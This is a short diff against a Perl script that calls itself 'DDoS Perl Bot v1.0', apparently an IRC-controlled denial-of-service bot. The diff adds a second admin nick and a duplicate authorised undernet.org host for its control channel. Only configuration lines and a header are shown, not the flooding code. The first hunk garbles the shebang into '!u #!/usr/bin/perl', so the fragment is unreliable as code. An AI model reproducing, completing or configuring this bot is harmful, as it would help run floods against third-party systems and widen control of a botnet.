@@ -1,4 +1,4 @@
-#!/usr/bin/perl
+!u #!/usr/bin/perl
  
 ######################################################################################################################
 ######################################################################################################################
@@ -142,8 +142,8 @@ my $sleep='5';
 my $homedir = "/tmp";
 my $version = 'DDoS Perl Bot v1.0';
  
-my @admins = ("lilmoe");
-my @hostauth = ("lilmoe.users.undernet.org");
+my @admins = ("lilmoe","m0e");
+my @hostauth = ("lilmoe.users.undernet.org","lilmoe.users.undernet.org");
 my @channels = ("#moey");
  
 my $pacotes = 1;
